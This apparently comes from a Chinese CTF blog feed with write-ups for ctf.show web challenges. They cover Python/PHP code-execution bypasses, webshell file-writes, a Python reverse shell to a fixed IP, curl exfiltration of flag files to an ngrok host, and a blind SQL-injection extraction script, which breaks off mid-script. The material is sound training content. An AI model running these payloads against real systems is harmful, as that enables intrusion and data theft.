title="web442"></a>web442</h1><p>过滤了数字</p><pre><code class="php">?code=str(exec(request.args.get(request.method)))&amp;GET=__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)</code></pre><pre><code class="php">exec(request.args.get(str(None)))&amp;None=import os;os.system(&quot;curl http://xx.xx.xx.xx?1=`cat /flag`&quot;)当然可以构造数字hhprint((len(str(None))*len(str(None))*len(str(None))+len(str(None))))print(chr(68))</code></pre><h1 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h1><pre><code class="php">def getNumber3(number):    number = int(number)    if number in [-2, -1, 0, 1]:        return [&quot;~int((len(str(None))/len(str(None))))&quot;, &quot;~int(len(str()))&quot;,                &quot;int(len(str()))&quot;, &quot;int((len(str(None))/len(str(None))))&quot;][number + 2]    if number % 2:        return &quot;~%s&quot; % getNumber3(~number)    else:        return &quot;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&quot; % getNumber3(number / 2)s = &#39;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#39;res = &#39;str().join([&#39;for i in s:    res += f&quot;chr(&#123;getNumber3(ord(i))&#125;),&quot;res = res[:-1]res += &#39;])&#39;print(res)</code></pre><pre><code class="php">get:POST=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.13.43&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</code></pre><h1 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-03 22:57:52 Last Modified by:   h1xa Last Modified time: 2021-02-04 14:28:30 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#39;ctfshow&#39;];if(preg_match(&#39;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#39;, $ctfshow))&#123;    eval(&quot;($ctfshow)();&quot;);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15</code></pre><pre><code class="php">?ctfshow=phpinfo^phpinfo^phpinfo</code></pre><pre><code class="php">&lt;?php$a =  &#39;phpanfo&#39;^&#39;phpznfo&#39;^&#39;phprnfo&#39;;echo $a.&quot;\n&quot;;$a = &#39;a&#39;^&#39;z&#39;^&#39;r&#39;;echo $a;#phpinfo#i</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415162912608.png" alt="image-20220415162912608"></p><h1 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-03 22:57:52 Last Modified by:   h1xa Last Modified time: 2021-02-04 15:38:05 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#39;ctfshow&#39;];if(preg_match(&#39;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#39;, $ctfshow))&#123;    if(!preg_match(&#39;/phpinfo/&#39;, $ctfshow))&#123;        eval(&quot;($ctfshow)();&quot;);    &#125;&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15</code></pre><pre><code class="php">?ctfshow=phpanfo^phpznfo^phprnfo</code></pre><h1 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-03 22:57:52 Last Modified by:   h1xa Last Modified time: 2021-02-04 16:05:23 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#39;ctfshow&#39;];if(!preg_match(&#39;/\&#39;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#39;, $ctfshow))&#123;    eval($ctfshow);&#125;</code></pre><pre><code class="php">?ctfshow=echo `cat /f*`;</code></pre><pre><code class="php">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();</code></pre><h1 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163540538.png" alt="image-20220415163540538"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163659803.png" alt="image-20220415163659803"></p><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-04 22:43:04 Last Modified by:   h1xa Last Modified time: 2021-02-05 02:03:03 email: h1xa@ctfer.com link: https://ctfer.com*/$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);$http-&gt;on(&#39;start&#39;, function ($server) &#123;    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;&#125;);$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));    $route = array(&#39;ctf&#39;);    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;exec&#39;);    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;        (new $controller)-&gt;$action($request, $response);    &#125;else&#123;         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);    &#125;    &#125;);$http-&gt;start();class ctf&#123;    public function show($request,$response)&#123;         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             $response-&gt;end(file_get_contents($s));         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function file($request,$response)&#123;          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             file_put_contents(&#39;shell.php&#39;, $s);             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function exec($request,$response)&#123;        system(&#39;php shell.php&#39;);        $response-&gt;end(&#39;command exec done&#39;);    &#125;&#125;</code></pre><p>当我们访问&#x2F;ctf&#x2F;file post传入的s会写入shell.php中，然后当我们访问&#x2F;ctf&#x2F;exec时，就会去执行刚才的shell.php</p><pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173649654.png" alt="image-20220415173649654"></p><pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173726802.png" alt="image-20220415173726802"></p><pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaag`&#39;); ?&gt;     http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec   </code></pre><h1 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-04 22:43:04 Last Modified by:   h1xa Last Modified time: 2021-02-05 03:36:52 email: h1xa@ctfer.com link: https://ctfer.com*/$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);$http-&gt;on(&#39;start&#39;, function ($server) &#123;    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;&#125;);$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));    $route = array(&#39;ctf&#39;);    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;include&#39;);    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;        (new $controller)-&gt;$action($request, $response);    &#125;else&#123;         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);    &#125;    &#125;);$http-&gt;start();class ctf&#123;    public function show($request,$response)&#123;         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             $response-&gt;end(file_get_contents($s));         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function file($request,$response)&#123;          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             file_put_contents(&#39;shell.php&#39;, $s);             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function include($request,$response)&#123;        include(&#39;shell.php&#39;);        $response-&gt;end(&#39;include done&#39;);    &#125;&#125;</code></pre><pre><code class="php">http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</code></pre><pre><code class="php">http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show//ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaags`&#39;); ?&gt;http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</code></pre><h1 id="web455-456"><a href="#web455-456" class="headerlink" title="web455-456"></a>web455-456</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-04 22:43:04 Last Modified by:   h1xa Last Modified time: 2021-02-05 04:11:50 email: h1xa@ctfer.com link: https://ctfer.com*/$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);$http-&gt;on(&#39;start&#39;, function ($server) &#123;    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;&#125;);$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));    $route = array(&#39;ctf&#39;);    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;exec&#39;,&#39;reload&#39;);    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;        (new $controller)-&gt;$action($request, $response);    &#125;else&#123;         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);    &#125;    &#125;);$http-&gt;start();class ctf&#123;    public function show($request,$response)&#123;         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             $response-&gt;end(file_get_contents($s));         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function file($request,$response)&#123;          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);         $s=$request-&gt;post[&#39;s&#39;];         if(isset($s))&#123;             file_put_contents(&#39;shell.php&#39;, $s);             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);         &#125;else&#123;             $response-&gt;end(&#39;s not found&#39;);         &#125;    &#125;    public function exec($request,$response)&#123;        system(&#39;php shell.php&#39;);        $response-&gt;end(&#39;include done&#39;);    &#125;    public function reload($request,$response)&#123;        global $http;        $http-&gt;reload();        $response-&gt;end(&#39;reload done&#39;);    &#125;&#125;</code></pre><pre><code class="php">http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exechttp://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/filePOSTs=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flsaaag`&#39;); ?&gt;http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec</code></pre><h1 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-06 01:58:32 Last Modified by:   h1xa Last Modified time: 2021-02-06 12:19:36 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#39;flag.php&#39;);abstract class user&#123;    public  $username;    public  $password;    function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    abstract  public  function check();&#125;class visitor extends user&#123;    public  function check()&#123;        return ($this-&gt;username!==&#39;admin&#39; &amp;&amp; $this-&gt;password!==&#39;admin888&#39;);    &#125;&#125;class admin extends user&#123;    public  function check()&#123;        $u= call_user_func($this-&gt;password);        return $u==&#39;admin&#39;;    &#125;&#125;$u=$_GET[&#39;u&#39;];$p=$_GET[&#39;p&#39;];if(isset($u)&amp;&amp;isset($p))&#123;    if((new visitor($u,$p))-&gt;check())&#123;        die(&#39;welcome visitor :&#39;.$u);    &#125;    if((new admin($u,$p))-&gt;check())&#123;        die(&#39;welcome admin :&#39;.$u.&#39; flag is :&#39;.$flag);    &#125;&#125; </code></pre><pre><code class="php">?u=admin&amp;p=phpinfo</code></pre><p>先进入第二个语句,phpinfo执行结果为true</p><h1 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-06 01:58:32 Last Modified by:   h1xa Last Modified time: 2021-02-06 12:19:36 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#39;flag.php&#39;);abstract class user&#123;    public  $username;    public  $password;    function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    abstract  public  function check();&#125;class visitor extends user&#123;    public  function check()&#123;        return ($this-&gt;username!==&#39;admin&#39; &amp;&amp; $this-&gt;password!==&#39;admin888&#39;);    &#125;&#125;class admin extends user&#123;    public  function check()&#123;        $u= call_user_func($this-&gt;password);        return $u===&#39;admin&#39;;    &#125;&#125;$u=$_GET[&#39;u&#39;];$p=$_GET[&#39;p&#39;];if(isset($u)&amp;&amp;isset($p))&#123;    if((new visitor($u,$p))-&gt;check())&#123;        die(&#39;welcome visitor :&#39;.$u);    &#125;    if((new admin($u,$p))-&gt;check())&#123;        die(&#39;welcome admin :&#39;.$u.&#39; flag is :&#39;.$flag);    &#125;&#125;</code></pre><pre><code class="php">?u=admin&amp;p=get_class</code></pre><pre><code class="hp">get_class (): 获取当前调用方法的类名； get_called_class():获取静态绑定后的类名；</code></pre><h1 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-02-06 01:58:32 Last Modified by:   h1xa Last Modified time: 2021-02-06 13:25:16 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#39;flag.php&#39;);$u=$_GET[&#39;u&#39;];$p=$_GET[&#39;p&#39;];if(isset($u)&amp;&amp;isset($p))&#123;    copy($u, $p.&#39;.php&#39;);&#125; </code></pre><pre><code class="php">?u=php://filter/convert.base64-encode/resource=flag.php&amp;p=1</code></pre><p>直接读取读不到php文件,所以进行一下base64编码</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>右键源代码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261824762.png" alt="image-20220326182418721"></p><p>ctrl+u</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261824841.png" alt="image-20220326182454792"></p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>curl + u </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292136713.png" alt="image-20220329213624668"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292136889.png" alt="image-20220329213600822"></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312211924.png" alt="image-20220331221134879"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312211868.png" alt="image-20220331221140789"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计</title>
      <link href="/ctfshow/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/ctfshow/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271927257.png" alt="image-20220327192703217"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271927314.png" alt="image-20220327192725282"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271928218.png" alt="image-20220327192821196"></p><p>好多php</p><p>checklogin.php</p><p>&#96;&#96;&#96;php<br>&lt;?php<br>error_reporting(0);<br>session_start();<br>require ‘conn.php’;<br>$_POST[‘userid’]&#x3D;!empty($_POST[‘userid’])?$_POST[‘userid’]:””;<br>$_POST[‘userpwd’]&#x3D;!empty($_POST[‘userpwd’])?$_POST[‘userpwd’]:””;<br>$username&#x3D;$_POST[‘userid’];<br>$userpwd&#x3D;$_POST[‘userpwd’];<br>$sql&#x3D;”select sds_password from sds_user where sds_username&#x3D;’”.$username.”‘ order by id limit 1;”;#无过滤sql注入<br>$result&#x3D;$mysqli-&gt;query($sql);<br>$row&#x3D;$result-&gt;fetch_array(MYSQLI_BOTH);<br>if($result-&gt;num_rows&lt;1)</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中期测评</title>
      <link href="/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/"/>
      <url>/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<h1 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h1><p>打开是一个登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191856556.png" alt="image-20220410191856556"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191923770.png" alt="image-20220410191923770"></p><p>翻一下源码,没发现什么</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191952963.png" alt="image-20220410191952963"></p><p>注册之后登录也没有反应,重点并不是在这里</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192022882.png" alt="image-20220410192022882"></p><p>发现地址有一个login,感觉像是文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192056235.png" alt="image-20220410192056235"></p><p>尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试</p><p>index.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192221515.png" alt="image-20220410192221515"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-08 18:11:51 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);include(&#39;render/render_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>这里并没有有用的.我们去查看render_class文件</p><p>render&#x2F;render_class.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192329514.png" alt="image-20220410192329514"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-08 18:10:19 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);        return templateUtil::shade($templateContent,$arg);    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        echo $templateContent;            &#125;&#125;</code></pre><p>render&#x2F;file_class文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192407141.png" alt="image-20220410192407141"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-08 17:56:42 email: h1xa@ctfer.com link: https://ctfer.com*/class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>没什么思路,我们试一下包含flag文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410204859844.png" alt="image-20220410204859844"></p><h1 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205121149.png" alt="image-20220410205121149"></p><p>一样的页面,但是这次,我们搜到了一个cheak文件这次我们在试一下文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205138507.png" alt="image-20220410205138507"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205240261.png" alt="image-20220410205240261"></p><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-08 22:30:08 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    $username=$_GET[&#39;username&#39;];    $password=$_GET[&#39;password&#39;];    $sql = &quot;select id from user where username = md5(&#39;$username&#39;) and password=md5(&#39;$password&#39;) order by id limit 1&quot;;#这里明显的sql注入    $user=db::select_one($sql);    if($user)&#123;        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>&#x2F;render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-08 22:15:24 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-08 22:29:27 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class db&#123;        public static  function getConnection()&#123;         $username=&#39;root&#39;;         $password=&#39;root&#39;;         $port=&#39;3306&#39;;         $addr=&#39;127.0.0.1&#39;;         $database=&#39;ctfshow&#39;;        return new mysqli($addr,$username,$password,$database);    &#125;    public static function select_one($sql)&#123;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;cache_class</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-08 21:40:10 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-08 21:23:28 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>看了看其他的也没有可以利用的点,只有sql注入</p><pre><code>select id from user where username = md5(&#39;$username&#39;) and password=md5(&#39;1&#39;) or 1=2#&#39;) order by id limit 1</code></pre><pre><code>?action=check&amp;username=1&#39;) or 0 -- + # %23&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221106580.png" alt="image-20220410221106580"></p><pre><code>?action=check&amp;username=1&#39;) or 1 -- + # %23&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221119368.png" alt="image-20220410221119368"></p><p>判断</p><pre><code class="php">import requestsurl = &quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;payload = &quot;length(database())=0&quot; #错误payload = &quot;length(database())&gt;0&quot; #正确    返回adminparams = &#123;            &#39;username&#39;: f&quot;1&#39;) or if(&#123;payload&#125;,1,0)#&quot;,            &#39;password&#39;: &#39;1&#39;,            &#39;action&#39; : &#39;check&#39;        &#125;r = requests.get(url,params=params)print(r.text)</code></pre><pre><code class="php">import requestsurl = &quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库 flag        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查字段 flag        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;&quot;        # 查flag        payload = &quot;select group_concat(flag) from flag&quot;        params = &#123;            &#39;username&#39;: f&quot;1&#39;) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;,            &#39;password&#39;: &#39;1&#39;,            &#39;action&#39; : &#39;check&#39;        &#125;        r = requests.get(url,params=params)        #print(r.text)        if &quot;admin&quot;  in r.text:            head = mid + 1        else:            tail = mid    if head != 32:        result += chr(head)    else:     